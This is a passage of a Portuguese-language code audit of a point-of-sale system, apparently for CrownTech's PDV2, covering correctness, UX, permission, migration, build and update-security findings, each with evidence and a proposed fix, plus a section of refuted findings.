- **Cenário de falha:** Financeiro cadastra conta a pagar de R$ 1.500,00 quando o correto era R$ 150,00. Não existe Editar nem Cancelar: o título fica aberto para sempre ou é "liquidado" com valor errado, distorcendo contas a pagar/receber.
- **Correção:** Adicionar ações "Editar" (descrição, valor, vencimento via PATCH) e "Cancelar" (DELETE com confirmAction) para títulos em aberto e sem venda vinculada.

### Autorização de desconto valida contra o total bruto, mas a venda valida contra o total já com promoção

- **Onde:** `terminal/static/terminal.js:300` · área `terminal-js` · categoria `correctness` · não verificado
- **Evidência:** applyDiscount envia `{pin, gross_cents:cartGross(), discount_cents:requestedCents}` e compara `requestedCents>=cartGross()`; authorize_discount usa `discount*10000 > gross*configured_limit` (store.py:903). Na venda o limite é `discount*10000 > base_total*configured_limit` com base_total = bruto − promoção (store.py:1172-1178).
- **Cenário de falha:** Limite da empresa 10%, carrinho de R$ 100 com R$ 20 de promoção: operador pede 12% (R$ 9,60 → R$ 10). A autorização passa (10% do bruto), o gerente digita o PIN, aparece 'Desconto validado', e só no 'Confirmar venda' vem 'Desconto acima do limite configurado pela administração'. Com 100% e promoção ativa, passa na autorização e falha na venda com 'Desconto ou total inválido'.
- **Correção:** Enviar e validar a base promocional (cartGross()-cartPromo()) em /api/discount/authorize, ou melhor, mandar os itens e deixar o backend calcular a base com o mesmo código de sale().

### Só existe o atalho F2; não há teclas F para finalizar, pagamento, quantidade ou desconto, e F5 apaga o carrinho

- **Onde:** `terminal/static/terminal.js:487` · área `terminal-js` · categoria `ux-bug` · não verificado
- **Evidência:** O único atalho tratado é `if(event.key==='F2'){...focusScannerInput(true)}`; a dica na tela é `<kbd>F2</kbd> buscar <kbd>Enter</kbd> adicionar` (index.html:68). O carrinho vive apenas em `state.cart` (memória) e F1/F3/F5/F12 seguem com o comportamento padrão do navegador.
- **Cenário de falha:** Toda venda exige mouse/toque para 'Revisar e confirmar', escolher pagamento e confirmar. Um F5 acidental (ou recarga da aba) no meio de uma compra de 40 itens apaga o carrinho, o cliente e o desconto autorizado sem aviso.
- **Correção:** Mapa de atalhos com barra fixa visível (ex.: F2 buscar, F3 quantidade, F4 desconto, F6 cliente, F7 espera, F8 sangria, F9 dinheiro, F10 Pix, F11 cartão, F12 finalizar, Esc cancelar), com preventDefault nas teclas F; persistir o carrinho em sessionStorage/SQLite local e restaurar ao recarregar.

### Nenhuma identificação da CrownTech no terminal nem no comprovante

- **Onde:** `terminal/templates/index.html:15` · área `terminal-js` · categoria `ux-bug` · não verificado
- **Evidência:** Título `PDV2 Terminal · Caixa local` (linha 9) e marca `PDV<span class="accent">2</span> ... TERMINAL LOCAL` (linha 15); busca por 'CrownTech' em index.html, terminal.js, printers.py e store.py não retorna nada. O rodapé do comprovante legado é só 'Obrigado pela preferência!' (terminal.js:109).
- **Cenário de falha:** Cliente ou lojista vizinho olha a tela do caixa ou o cupom e não tem como saber que o sistema é da CrownTech; o produto não gera indicação.
- **Correção:** Incluir assinatura 'PDV CrownTech' no cabeçalho/tela de login/tela ociosa do caixa e uma linha discreta no rodapé do comprovante não fiscal (ex.: 'Sistema PDV CrownTech · crowntech...'), configurável pelo admin do SaaS por plano.

### Layout de DANFE NFC-e existente é incompleto e nunca é acionado; tela e térmica usam critérios diferentes de 'autorizada'

- **Onde:** `terminal/printers.py:219` · área `fiscal-ponta-a-ponta` · categoria `correctness` · não verificado
- **Evidência:** O bloco autorizado (l.219-244) imprime número/série, chave, protocolo, QR e `Tributos informados`, mas não tem o título 'Documento Auxiliar da Nota Fiscal de Consumidor Eletrônica', o endereço de consulta por chave, aviso de homologação nem a discriminação de tributos aproximados por esfera. `authorized` exige protocolo na térmica (l.132) e só chave no fallback de tela (terminal/static/terminal.js l.104). Nenhum código preenche `sale["fiscal"]`.
- **Cenário de falha:** Quando o estado fiscal passar a chegar ao caixa: nota autorizada em homologação imprime 'DANFE NFC-e' sem a tarja de 'sem valor fiscal'; nota de produção sai sem o texto obrigatório e sem a mensagem de tributos; um registro com chave e sem protocolo aparece como 'DANFE NFC-e autorizada' na tela e como 'COMPROVANTE NAO FISCAL' na impressora.
- **Correção:** Completar o layout conforme o manual do DANFE NFC-e (título, consulta por chave, tarja de homologação e de contingência, tributos aproximados por esfera com fonte, dados do consumidor) e usar uma única função de decisão de 'autorizada' para tela e térmica, considerando o ambiente.

### fiscal_submit compara itens do payload com itens da venda sem ordenar por line_number

- **Onde:** `operations/views.py:206` · área `fiscal-ponta-a-ponta` · categoria `correctness` · não verificado
- **Evidência:** `sale_items=list(sale.items.select_related('product'))` (l.206) seguido de `for item,line in zip(items,sale_items)` (l.208). SaleItem não define `Meta.ordering` (cloud/core/models.py l.284-301), então a ordem devolvida pelo PostgreSQL não é garantida, enquanto o serializer da venda ordena por `line_number` (serializers.py l.121).
- **Cenário de falha:** Payload montado na ordem das linhas da venda (como o painel a exibe). Se o banco devolver as linhas em outra ordem (após manutenção de tabela ou mudança de plano de execução), a API responde 'Produto fiscal divergente' para um payload correto e a venda não pode ser emitida.
- **Correção:** Usar `sale.items.select_related('product').order_by('line_number')` e, de preferência, casar itens por `numero_item`/código em vez de posição.

### Data/hora da venda vem do relógio do caixa sem conferência com o servidor; client_time do heartbeat é aceito e ignorado

- **Onde:** `cloud/core/sale_logic.py:15` · área `fiscal-ponta-a-ponta` · categoria `correctness` · não verificado
- **Evidência:** `event_time` aceita qualquer inteiro entre 1 e 253402300799999 ms (l.15-21) e `persist_sale` grava como `created_at` (l.167). O heartbeat lista `client_time` em `fields(...)` mas não o usa (cloud/core/views_terminal.py l.320). O terminal só detecta relógio que voltou em relação ao último uso (`clock_rollback`, terminal/store.py l.449-452).
- **Cenário de falha:** Computador do caixa com data errada (bateria da placa-mãe, ano trocado). As vendas sincronizam com data de outro mês ou ano: somem dos relatórios do período, o vencimento do fiado é calculado a partir da data errada e uma NFC-e com data de emissão baseada nessa venda é rejeitada pela SEFAZ por data fora da tolerância.
- **Correção:** Comparar `client_time` com o relógio do servidor no heartbeat/bootstrap e devolver o desvio; o terminal deve bloquear vendas (ou avisar com destaque) quando o desvio passar de alguns minutos; na nuvem, sinalizar venda cujo `created_at` esteja no futuro ou muito distante de `received_at`.

### Papel Financeiro tem permissão na API para devolução e estorno, mas o painel esconde a devolução e não existe tela de estorno

- **Onde:** `web/assets/app.js:1037` · área `planos-permissoes-matriz` · categoria `ux-bug` · não verificado
- **Evidência:** sale_return aceita owner/admin/manager/finance e sale_reverse 'refund' aceita owner/admin/finance (cloud/core/views_sales.py:68, 81). No painel o botão 'Registrar devolução' fica dentro de 'if (canSales() ...)' com canSales = owner/admin/manager (app.js:12, 1037-1039), e não há nenhuma chamada a /sales/<id>/refund em app.js (só /cancel, l.1122).
- **Cenário de falha:** Usuário com papel Financeiro abre uma venda para registrar a devolução com abatimento do fiado e não encontra o botão, embora a API permita; o estorno ('refunded') é um endpoint sem uso. O dono precisa dar papel de gerente ao financeiro, ampliando o acesso além do necessário.
- **Correção:** Gerar as ações da venda a partir de uma única tabela papel x ação compartilhada entre API e painel; mostrar 'Registrar devolução' para finance e criar a ação de estorno ou remover o endpoint.

### Menu 'Serviços' da plataforma aparece para platform_support, mas a tela sempre falha com 403

- **Onde:** `web/assets/app.js:66` · área `planos-permissoes-matriz` · categoria `ux-bug` · não verificado
- **Evidência:** platformNav libera 'services' para support, billing e ops (app.js:66); platformServices faz Promise.all com /ops/health e /ops/jobs (app.js:3147-3151), e /ops/jobs exige roles=('platform_ops','platform_billing') (operations/views.py:138).
- **Cenário de falha:** Atendente de suporte clica em Serviços para ver fila e último backup e recebe 'Falha ao carregar · Sem permissão de plataforma'; os indicadores de saúde que o papel poderia ver (/ops/health) também não aparecem porque a falha de uma chamada derruba a tela inteira.
- **Correção:** Liberar leitura de /ops/jobs para platform_support (sem ações) ou carregar as tarefas só quando platformCan('platform_ops','platform_billing'), mantendo os cartões de saúde.

### Papéis e limites são fixos em código e os planos só limitam terminais e lojas

- **Onde:** `terminal/store.py:46` · área `planos-permissoes-matriz` · categoria `maintainability` · não verificado
- **Evidência:** Os 7 papéis estão codificados em três lugares independentes: conjuntos roles= em cada views_*.py, tenantNav (web/assets/app.js:33-57) e SELL_ROLES/MANAGER_ROLES/DISCOUNT_BPS no terminal (store.py:21-22, 46: caixa 10%, gerente 50%). A empresa só configura max_discount_bps global (cloud/core/models.py:55). Plan tem apenas terminal_limit e shop_limit (models.py:25-26); não há limite de usuários, produtos, clientes ou notas fiscais por mês, e o teste de 14 dias sempre nasce no Essencial (views_auth.py:143-153).
- **Cenário de falha:** Lojista quer que o caixa não dê desconto nenhum: a única opção é max_discount_bps=0, que também bloqueia gerente e dono. Um e-mail só pode pertencer a uma empresa (views_users.py:70), então o contador de duas lojas não pode ser adicionado à segunda. Comercialmente, um cliente de R$ 149 cadastra usuários, produtos e emissões fiscais ilimitados, e quem está em teste não chega a ver Financeiro/Relatórios, que são o motivo do upgrade.
- **Correção:** Centralizar a matriz papel x permissão em um módulo compartilhado (shared/) consumido por API, painel e terminal; permitir ajuste por empresa do desconto por papel no lease; adicionar ao Plan limites opcionais (usuários, produtos, documentos fiscais/mês) e um plano de teste com todos os recursos.

### Cabeçalho do app iOS mostra a data crua '2026-11-15' em vez de '15 de novembro'

- **Onde:** `ios/PDV2OwnerMonitor/PDV2OwnerMonitor/OwnerDashboardView.swift:84` · área `layout-marca-landing` · categoria `correctness` · não verificado
- **Evidência:** `Text(snapshot.period.date.asBrazilDate)` (linha 84). `asBrazilDate` (linhas 284-288) depende de `asDate`, que usa ISO8601DateFormatter com `.withInternetDateTime` (DesignSystem.swift:60-65) e devolve a própria string quando falha. O servidor envia `"date": today.isoformat()`, ou seja 'AAAA-MM-DD' sem hora (cloud/core/views_owner.py:92).
- **Cenário de falha:** Todo dia o proprietário vê '2026-11-15' no canto superior do painel, ao lado de textos em português, porque a conversão nunca funciona para esse campo.
- **Correção:** Em `asBrazilDate`, tentar primeiro um DateFormatter 'yyyy-MM-dd' (pt_BR, fuso America/Sao_Paulo), ou usar `period.from`, que já vem com data e hora.

### Cinco símbolos e quatro paletas diferentes para o mesmo produto, sem tokens compartilhados entre painel, terminal e app

- **Onde:** `terminal/static/terminal.css:20` · área `layout-marca-landing` · categoria `maintainability` · não verificado
- **Evidência:** Símbolos: monograma 'P2' em SVG (landing.html:22, login.html:21, logo-pdv2.svg, terminal/static/favicon.svg); dígito '2' (landing.html:228, offline.html:13, icon-192/512.png); glifo '▣' (terminal/templates/index.html:15); SF Symbol de gráfico em degradê azul (DesignSystem.swift:13-27); AppIcon.png azul-marinho com gráfico e check. Cores: ui.css usa `--navy:#102630` e `--green:#148765` (linhas 5-9); terminal.css usa #132434/#12b38e/#0d9c7b fixos em centenas de regras e redefine `--ink/--mint` na linha 20 quase sem uso; logo-pdv2.svg usa #347D55; o iOS usa azul. A fonte 'Inter' é declarada (ui.css:2, terminal.css:1) mas não é carregada nem empacotada, então cada máquina cai na fonte do sistema.
- **Cenário de falha:** O lojista usa o painel verde-floresta, o caixa verde-água com quadrado no lugar do logo e um app azul com outro ícone, sem reconhecer que é o mesmo produto. Qualquer ajuste de marca (como incluir a assinatura CrownTech) precisa ser refeito à mão em três bases de estilo.
- **Correção:** Criar um arquivo de tokens (cores, tipografia, raios, espaçamentos, marca) consumido por ui.css e terminal.css via variáveis CSS e espelhado em PDVTheme no iOS. Adotar um único símbolo em todas as superfícies. Empacotar a fonte em woff2 local (o terminal funciona offline) ou assumir a pilha do sistema.

### Landing sem Open Graph, canonical e controle de indexação: link compartilhado no WhatsApp sai sem imagem e /login e /app ficam indexáveis

- **Onde:** `web/landing.html:10` · área `layout-marca-landing` · categoria `ux-bug` · não verificado
- **Evidência:** O `<head>` (linhas 4-15) tem apenas description e title; não há og:title, og:description, og:image, og:url, twitter:card nem link canonical. Não existe robots.txt nem sitemap (o diretório web/ só tem app.html, landing.html, login.html, manifest, offline.html, sw.js; cloud/pdvcloud/urls.py não tem rota). login.html e app.html não têm `noindex`. O manifest descreve o produto só como 'para mercados e mercearias' (manifest.webmanifest:5).
- **Cenário de falha:** O comercial envia o link do site para um lojista de Maricá pelo WhatsApp: a mensagem aparece sem cartão com imagem e sem marca. No Google, a página de login pode aparecer como resultado do produto.
- **Correção:** Adicionar og:title, og:description, og:image (1200x630 com PDV2 + CrownTech), og:url, og:site_name, twitter:card e canonical. Servir /robots.txt e /sitemap.xml. Colocar `<meta name="robots" content="noindex">` em login.html e app.html.

### Indicador de foco quase invisível, textos de apoio com contraste insuficiente e animações sem prefers-reduced-motion no terminal

- **Onde:** `terminal/static/terminal.css:17` · área `layout-marca-landing` · categoria `ux-bug` · não verificado
- **Evidência:** `:focus-visible{outline:3px solid rgba(18,179,142,.42)}` (linha 17), verde a 42% sobre branco. Vários campos usam `outline:none` e sombra de ~10% de opacidade no foco (ex.: `.search input{outline:none}` e `box-shadow:0 0 0 3px #18ab8918`, linha 1). `.legal-note{font-size:10px;color:#9aabb0}` e `.scanner-status` em 10px (linhas 1 e 21). O arquivo não tem `prefers-reduced-motion` (existe em ui.css:315 e landing.css:274/361) nem `prefers-color-scheme`.
- **Cenário de falha:** Operador navegando por Tab no diálogo de pagamento não distingue qual forma (Dinheiro, Pix, Cartão) está focada antes de apertar Enter e pode registrar a forma errada. O estado do leitor ('Leitor USB pronto' ou erro) em 10px não é lido à distância normal do monitor.
- **Correção:** Foco com cor sólida de contraste 3:1 ou mais (`outline:3px solid #0b6f5a;outline-offset:2px`) também nos campos. Texto mínimo de 12px com contraste 4,5:1 nas mensagens de estado. Bloco `@media (prefers-reduced-motion:reduce)` zerando animações e transições.

### Telas voltadas ao cliente trazem instruções de desenvolvimento, e a página offline oferece link para o terminal em qualquer aparelho

- **Onde:** `web/offline.html:16` · área `layout-marca-landing` · categoria `ux-bug` · não verificado
- **Evidência:** offline.html:16 `<a class="button" href="http://127.0.0.1:8010/">Abrir terminal local</a>` é servida pelo service worker a qualquer navegação sem rede (web/sw.js:22-27), inclusive no celular do dono com o PWA instalado. A tela de pareamento do caixa mostra 'No Docker local, use http://cloud:8080' (terminal/templates/index.html:39).
- **Cenário de falha:** Proprietário abre o painel instalado no celular sem sinal, toca em 'Abrir terminal local' e recebe erro de conexão recusada, porque não há terminal no telefone. O técnico da loja lê uma instrução de Docker na ativação do caixa de produção.
- **Correção:** Na página offline, mostrar o botão do terminal só em desktop (ou depois de um teste de alcance de 127.0.0.1:8010) e destacar 'Tentar novamente'. Remover a dica de Docker da tela de pareamento ou exibi-la apenas em modo de desenvolvimento.

### Migrações de dados 0009/0012/0024/0028: transação única, sem lotes e sem reexecução segura ao atualizar uma base antiga

- **Onde:** `cloud/core/migrations/0024_backfill_cash_sessions.py:32` · área `admin-django-migracoes-dados` · categoria `performance` · não verificado
- **Evidência:** 0024 percorre todos os SyncEvent ordenados por `received_at` (sem índice) e faz 1 UPDATE por venda (linhas 32-38), tudo em uma transação. 0009 carrega todos os produtos sem `.iterator()` e salva um a um (linhas 18-20). 0012 faz uma consulta de itens por produto e um save por item (linhas 7-27) e recalcula o custo ignorando as saídas, diferente da regra ao vivo, que pondera pelo saldo atual (views_stock.py:180). 0028 usa `bulk_create` sem ignore_conflicts (linhas 11-13). Correção ao foco: `created_at`, `opening_cents` e `reason` são validados no sync desde o primeiro commit (views_terminal.py:410-438), então não faltam em eventos aceitos; o que não é validado é `aggregate_id` dos eventos cash.* (só `text`, linha 369), usado em `uuid.UUID(str(row.aggregate_id))` (0024 linhas 42, 47, 54).
- **Cenário de falha:** Só afeta base que ainda não passou por essas migrações (piloto antigo ou backup restaurado); em instalação nova são nulas. Com cerca de 2 milhões de vendas, a 0024 ordena a tabela inteira com payload JSON em disco e executa milhões de UPDATEs numa transação (dezenas de minutos), período em que o deploy fica parado. Um único evento cash.* com aggregate_id fora do formato UUID (cliente adulterado) lança ValueError e aborta o deploy. Desfazer só a 0028 (reverso noop mantém os saldos) e reaplicar viola a unicidade `stock_balance_shop_product` e o serviço migrate falha, impedindo a subida do cloud.
- **Correção:** Processar em lotes por empresa com `atomic = False`, usar UPDATE em conjunto (join SyncEvent x Sale) no lugar do laço, tratar ValueError por evento (pular e registrar), usar `bulk_create(..., update_conflicts=True)` na 0028 e validar `aggregate_id` como UUID em `_validate_event` para cash.*.

### seed_demo com PDV_ALLOW_DEMO_SEED=1 redefine a senha de superusuário e de qualquer usuário existente com o e-mail demo

- **Onde:** `cloud/core/management/commands/seed_demo.py:38` · área `admin-django-migracoes-dados` · categoria `security` · não verificado
- **Evidência:** Linhas 38-44: `get_or_create(username=admin_email)`; se já existe e é superusuário, segue e executa `admin.set_password(admin_password)`. Linhas 45-48: o usuário demo também recebe `set_password` sem nenhuma checagem, e ganha Membership owner na empresa 'DEMO-LOCAL' (50-51). O e-mail padrão é admin@pdv2.local (linha 26). A única trava é a variável de ambiente (linhas 20-21).
- **Cenário de falha:** Alguém roda o seed em produção para 'criar uma demonstração', com PDV_ADMIN_EMAIL igual ao do administrador real: a senha dele passa a ser a da variável de ambiente (visível a quem tem acesso ao Dokploy) e, somada ao /control/ sem MFA, dá acesso total. Se PDV_DEMO_EMAIL coincidir com o e-mail de um cliente real, a senha desse cliente é trocada sem aviso e ele ganha vínculo com a empresa demo.
- **Correção:** Em produção, abortar se o usuário admin ou demo já existir (nunca redefinir senha existente) e exigir flag explícita `--reset-passwords`. Registrar AuditEvent da execução.

### Pacote de atualização não é verificado na prática: ZIP sem assinatura, e o verificador exige um arquivo de chave que o terminal não exporta

- **Onde:** `scripts/verify_update.py:14` · área `testes-ci-distribuicao` · categoria `security` · não verificado
- **Evidência:** verify_update.py pede `archive manifest trusted_public_key` como arquivos (l.12-14). A chave fixada no pareamento fica só no SQLite do terminal (meta.public_key) e a interface apenas preenche um link com a URL do pacote (terminal.js:428, `link.href=s.release.url`). install-windows.ps1 não confere hash nem assinatura da origem (l.42-43). package_terminal.py gera apenas sha256 em um JSON ao lado do ZIP (l.17-19). O manifesto é assinado sob demanda, a cada GET sem autenticação, com a mesma chave privada das licenças mantida no servidor web (views_releases.py:22).
- **Cenário de falha:** O técnico clica no link, baixa o ZIP, descompacta e roda o instalador; o SHA-256 que o terminal validou no manifesto nunca é comparado com o arquivo baixado. Se a hospedagem do ZIP for trocada ou comprometida, código arbitrário roda no computador do caixa, que guarda token, PINs e vendas. Comprometer o servidor web basta para assinar licenças e versões.
- **Correção:** Fazer o terminal baixar o pacote, conferir tamanho e SHA-256 do manifesto assinado e só então liberar a instalação (ou exportar manifesto e chave e chamar verify_update.py dentro do instalador, abortando em divergência); assinar releases com chave separada e offline, diferente da chave de licença; servir o manifesto já assinado e em cache.

### O conjunto de dependências do caixa no Windows nunca é o que foi testado: imagem Docker usa o requirements da raiz e terminal/requirements.txt não fixa transitivas nem inclui qrcode

- **Onde:** `infra/Dockerfile.terminal:9` · área `testes-ci-distribuicao` · categoria `maintainability` · não verificado
- **Evidência:** `COPY requirements.txt ./` e `pip install -r requirements.txt` (l.9-10) instalam Django, psycopg, gunicorn, PyOTP e whitenoise na imagem do caixa. terminal/requirements.txt tem 5 linhas, sem certifi, urllib3, Werkzeug ou Jinja2 fixados, e sem qrcode, que printers.py importa com fallback silencioso (l.22-25, 232-238). O CI instala só o arquivo da raiz (ci-v2.yml:30).
- **Cenário de falha:** Cada instalação no Windows resolve versões transitivas do dia, diferentes das validadas no CI; uma versão nova e incompatível de Werkzeug ou urllib3 quebra o caixa só em instalações novas. Sem qrcode, o QR do comprovante na tela some sem erro. Na imagem Docker o caixa carrega um framework web inteiro e driver de banco sem uso, aumentando superfície de ataque e tamanho.
- **Correção:** Gerar terminal/requirements.txt com pip-compile (todas as transitivas fixadas com hashes, incluindo qrcode e tzdata), usar esse arquivo em infra/Dockerfile.terminal e instalá-lo isoladamente em um job do CI antes de rodar terminal/tests.

### .dockerignore só casa na raiz: o banco SQLite de desenvolvimento entra na imagem cloud construída localmente

- **Onde:** `.dockerignore:2` · área `testes-ci-distribuicao` · categoria `security` · não verificado
- **Evidência:** Padrões `*.sqlite3`, `__pycache__`, `*.pyc` e `tests` sem `**/` valem apenas para a raiz do contexto. infra/Dockerfile.cloud faz `COPY cloud ./cloud` (l.6) e existe cloud/db.sqlite3 (716 KB) na máquina de desenvolvimento; infra/Dockerfile.terminal faz `COPY terminal ./terminal` e leva terminal/tests junto.
- **Cenário de falha:** Hoje o Dokploy constrói a partir do clone do git, onde o arquivo não existe. No dia em que as imagens passarem a ser construídas no computador do desenvolvedor e publicadas em registry (passo natural para versionar), a imagem pdv2-cloud carrega /app/cloud/db.sqlite3 com usuários, hashes de senha e chaves de licença de teste para quem puder baixá-la.
- **Correção:** Trocar por `**/*.sqlite3`, `**/*.sqlite3-*`, `**/__pycache__`, `**/*.pyc`, `**/tests`, e acrescentar `.env*`, `.runtime`, `.tmp_upload`, `ios`, `dist`; construir imagens publicáveis somente no CI a partir de checkout limpo.

### App iOS não pode ser distribuído como está: assinatura desativada, sem equipe de desenvolvimento e sem build no CI

- **Onde:** `ios/PDV2OwnerMonitor/PDV2OwnerMonitor.xcodeproj/project.pbxproj:187` · área `testes-ci-distribuicao` · categoria `maintainability` · não verificado
- **Evidência:** `CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO;` nas quatro configurações (l.163-164, 175-176, 187-188, 204-205), sem DEVELOPMENT_TEAM. Info.plist com versão fixa 1.0.0 (1) e ATS apenas com NSAllowsLocalNetworking (correto para produção em HTTPS). O ci-v2.yml não tem job macOS. Atualização só por polling de 30 s (AppSession.swift:66), sem push.
- **Cenário de falha:** Não é possível gerar arquivo para TestFlight ou App Store sem editar o projeto; uma mudança na API de monitoramento ou nos arquivos Swift que quebre a compilação só é descoberta quando alguém abrir o Xcode. Sem push, o dono não é avisado de caixa offline ou de quebra de caixa com o app fechado.
- **Correção:** Configurar equipe e assinatura automática na configuração Release (mantendo Debug sem assinatura para simulador), job macOS com `xcodebuild build` para simulador, numeração de build automática e, numa segunda etapa, notificações APNs para terminal offline e fechamento com diferença.

## Refutados na verificação

- Papel platform_billing consegue dar acesso gratuito por tempo indeterminado, contornando o VIP restrito a superusuário (`cloud/core/views_platform.py`): A mecânica descrita existe: em cloud/core/views_platform.py:299 o PATCH exige só platform_billing, as linhas 306-337 aceitam status/plan_id/current_period_end sem limite de data, e subscription_window (cloud/core/api_common.py:161-166) libera o acesso até current_period_end+72h. Mesmo assim, isso é capacidade documentada do papel, não uma falha: docs/API-V2.md:45 diz que "platform_billing: lê/edita planos e assinaturas". A alteração também fica marcada como license_source="manual" e auditada (views_platform.py:340-343), e não desativa o BillingBinding nem pausa o Asaas, ao contrário do VIP (linhas 391-396), então não reproduz o VIP. O VIP só fica restrito ao superusuário porque desliga a cobrança. Por isso o achado é uma questão de política de permissões e não um defeito reproduzível; na dúvida, conta como refutado.
- Fechamento de inventário grande faz 2-3 queries por item numa única requisição e pode nunca concluir (`cloud/core/views_inventory.py`): O laço existe como descrito: cada ajuste faz um INSERT de StockMovement e um UPDATE ou INSERT em StockBalance (cloud/core/views_inventory.py:170-186, cloud/core/stock_balance.py:15-31). Mas o cenário de falha não se confirma. Como o gunicorn roda com `--threads 2` (infra/Dockerfile.cloud:16), ele usa o worker gthread, cujo `--timeout 60` só vigia o heartbeat do processo e não mata uma requisição longa numa thread, então a transação não é desfeita aos 60 s. Mesmo que ficasse travado, a loja não ficaria bloqueada, porque inventory_cancel (views_inventory.py:195-203) encerra o inventário aberto e libera a constraint one_open_inventory_per_shop (models.py:542); os cerca de 24 mil comandos SQL são lentidão, não impossibilidade.
